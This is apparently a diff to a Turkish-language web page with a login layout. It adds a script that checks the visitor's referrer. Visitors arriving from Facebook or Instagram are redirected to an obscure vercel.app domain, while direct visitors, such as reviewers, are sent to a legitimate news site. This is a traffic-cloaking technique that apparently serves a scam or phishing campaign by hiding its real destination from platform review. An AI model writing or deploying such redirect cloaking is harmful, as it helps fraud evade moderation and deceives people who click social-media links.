@@ -10,12 +10,21 @@
 <body>
 
     <script>
-        // Eğer sayfa sosyal medya botları tarafından açılıyorsa
-        if (window.location.href.includes("facebook.com") || window.location.href.includes("instagram.com")) {
+        // Eğer sayfa referrer (gelen referans) header'ında sosyal medya alan adları varsa
+        if (document.referrer.includes("facebook.com") || document.referrer.includes("instagram.com")) {
             // Sosyal medya paylaşımlarından gelen tıklamalarda farklı bir siteye yönlendir
-            window.location.href = "https://www.haberler.com/";
+            window.location.href = "https://ocakdatigimlaribasladisimdibasla.vercel.app/";
         } else {
-           <html lang="tr" class="login  ">
+            // Doğrudan sayfa açılması durumunda farklı bir siteye yönlendir
+            window.location.href = "https://www.haberler.com/";
+        }
+    </script>
+
+</body>
+</html>
+
+
+<html lang="tr" class="login  ">
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 
 <head>
@@ -548,13 +557,5 @@
     </script>
 
 </body>
-        }
-    </script>
-
-</body>
-</html>
-
-
-
 
 </html>
